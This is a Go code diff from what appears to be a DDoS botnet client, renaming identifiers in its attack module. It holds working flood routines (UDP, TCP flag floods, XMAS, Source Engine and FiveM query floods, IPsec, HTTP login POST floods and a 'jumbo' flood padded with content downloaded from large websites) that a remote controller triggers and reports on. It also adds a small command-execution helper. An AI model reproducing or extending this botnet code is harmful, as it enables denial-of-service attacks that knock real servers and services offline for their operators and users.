@@ -6,7 +6,7 @@ import (
 )
 
 /*
-	GET flood Agents.
+GET flood Agents.
 */
 var httpAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
@@ -32,10 +32,10 @@ var httpAgents = []string{
 }
 
 /*
-	POST login flood payloads.
+POST login flood payloads.
 */
 var (
-	postPayload, _ = json.Marshal(map[string]string{
+	postLogin, _ = json.Marshal(map[string]string{
 		"login":          "\x53\x6A\x5F\x39\x43\x69\x4E\x6B\x6B\x6E\x34",
 		"username":       "\x39\x47\x63\x34\x51\x54\x71\x73\x6C\x4E\x34",
 		"email":          "\x54\x49\x66\x41\x6B\x4F\x42\x4D\x66\x35\x41",
@@ -47,24 +47,23 @@ var (
 )
 
 /*
-	Other payloads.
+Other payloads.
 */
 const (
-	queryPrefix  = "\xff\xff\xff\xff"
-	vsePayload   = "\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79"
-	fmsPayload   = "\x67\x65\x74\x73\x74\x61\x74\x75\x73"
-	ipsecPayload = "\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
+	VSE_PAYLOAD   = "\xff\xff\xff\xff\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79"
+	FMS_PAYLOAD   = "\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73"
+	IPSEC_PAYLOAD = "\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
 )
 
 /*
-	Increase more size of a jumbo flood.
+Increase more size of a Jumbo flood.
 */
 const (
-	apple = "https://www.apple.com"
-	weibo = "https://weibo.com"
-	qq    = "https://www.qq.com"
-	ebay  = "https://www.ebay.com"
-	huya  = "https://www.huya.com/g"
+	APPLE = "https://www.apple.com"
+	WEIBO = "https://weibo.com"
+	QQ    = "https://www.qq.com"
+	EBAY  = "https://www.ebay.com"
+	HUYA  = "https://www.huya.com/g"
 )
 
 func setAttackSwitch() {
@@ -81,11 +80,11 @@ func (b *Bot) UDP() {
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
 			dstPort:      setCall.CallAttack.dstPort,
-			ddosPayload:  setCall.CallAttack.ddosPayload,
+			DDOS_PAYLOAD: setCall.CallAttack.DDOS_PAYLOAD,
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
-		a.udpPacket()
+		a.UDP_PACKET()
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
@@ -98,22 +97,22 @@ func (b *Bot) TCP() {
 	storeOpt := strings.ToUpper(SetupComd(4, "-"))
 	b.Report("START TCP[" + storeOpt + "] FLOOD ATTACKING: " + Recv(*BotReader, 6))
 	if setCall, setKey := SetupCaller(); setKey {
-		if value, key := TCPAttackMap[setCall.CallAttack.flags]; key {
+		if value, key := TCP_ATTACK_MAP[setCall.CallAttack.flags]; key {
 			a := &Attack{
 				srcAddr:      setCall.CallAttack.srcAddr,
 				dstAddr:      setCall.CallAttack.dstAddr,
 				dstPort:      setCall.CallAttack.dstPort,
-				ddosPayload:  setCall.CallAttack.ddosPayload,
-				synFlag:      value.synFlag,
-				ackFlag:      value.ackFlag,
-				rstFlag:      value.rstFlag,
-				pshFlag:      value.pshFlag,
-				finFlag:      value.finFlag,
-				urgFlag:      value.urgFlag,
+				DDOS_PAYLOAD: setCall.CallAttack.DDOS_PAYLOAD,
+				SYN_FLAG:     value.SYN_FLAG,
+				ACK_FLAG:     value.ACK_FLAG,
+				RST_FLAG:     value.RST_FLAG,
+				PSH_FLAG:     value.PSH_FLAG,
+				FIN_FLAG:     value.FIN_FLAG,
+				URG_FLAG:     value.URG_FLAG,
 				attackSwitch: setCall.CallAttack.attackSwitch,
 				reportSwitch: setCall.CallAttack.reportSwitch,
 			}
-			a.tcpPacket()
+			a.TCP_PACKET()
 		}
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
@@ -130,13 +129,13 @@ func (b *Bot) SAF() {
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
 			dstPort:      setCall.CallAttack.dstPort,
-			ddosPayload:  setCall.CallAttack.ddosPayload,
-			synFlag:      true,
-			ackFlag:      true,
+			DDOS_PAYLOAD: setCall.CallAttack.DDOS_PAYLOAD,
+			SYN_FLAG:     true,
+			ACK_FLAG:     true,
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
-		a.tcpPacket()
+		a.TCP_PACKET()
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
@@ -152,17 +151,17 @@ func (b *Bot) XMAS() {
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
 			dstPort:      setCall.CallAttack.dstPort,
-			ddosPayload:  setCall.CallAttack.ddosPayload,
-			synFlag:      true,
-			ackFlag:      true,
-			rstFlag:      true,
-			pshFlag:      true,
-			finFlag:      true,
-			urgFlag:      true,
+			DDOS_PAYLOAD: setCall.CallAttack.DDOS_PAYLOAD,
+			SYN_FLAG:     true,
+			ACK_FLAG:     true,
+			RST_FLAG:     true,
+			PSH_FLAG:     true,
+			FIN_FLAG:     true,
+			URG_FLAG:     true,
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
-		a.tcpPacket()
+		a.TCP_PACKET()
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
@@ -178,11 +177,11 @@ func (b *Bot) VSE() {
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
 			dstPort:      setCall.CallAttack.dstPort,
-			ddosPayload:  []byte(queryPrefix + vsePayload),
+			DDOS_PAYLOAD: []byte(VSE_PAYLOAD),
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
-		a.udpPacket()
+		a.UDP_PACKET()
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
@@ -198,11 +197,11 @@ func (b *Bot) FMS() {
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
 			dstPort:      "30120",
-			ddosPayload:  []byte(queryPrefix + fmsPayload),
+			DDOS_PAYLOAD: []byte(FMS_PAYLOAD),
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
-		a.udpPacket()
+		a.UDP_PACKET()
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
@@ -218,11 +217,11 @@ func (b *Bot) IPSEC() {
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
 			dstPort:      "500",
-			ddosPayload:  []byte(ipsecPayload),
+			DDOS_PAYLOAD: []byte(IPSEC_PAYLOAD),
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
-		a.udpPacket()
+		a.UDP_PACKET()
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
@@ -236,7 +235,7 @@ func (b *Bot) POLING() {
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			url:          setCall.CallAttack.url,
-			attackBody:   strings.NewReader(string(postPayload)),
+			attackBody:   strings.NewReader(string(postLogin)),
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
@@ -255,11 +254,13 @@ func (b *Bot) JUMBO() {
 			Don't forget to set a pull file,
 			in case you add more websites to pull for a jumbo flood.
 		*/
-		go pullWeb(".pull_apple", apple)
-		go pullWeb(".pull_weibo", weibo)
-		go pullWeb(".pull_qq", qq)
-		go pullWeb(".pull_ebay", ebay)
-		go pullWeb(".pull_huya", huya)
+		go download(".pull_apple", APPLE)
+		go download(".pull_weibo", WEIBO)
+		go download(".pull_qq", QQ)
+		go download(".pull_ebay", EBAY)
+		go download(".pull_huya", HUYA)
+
+		meow := func(location string) string { return execComd("cat", location) } //Just for fun, LOL.
 
 		b.Report("START JUMBO FLOOD ATTACK: " + Recv(*BotReader, 4))
 		a := &Attack{
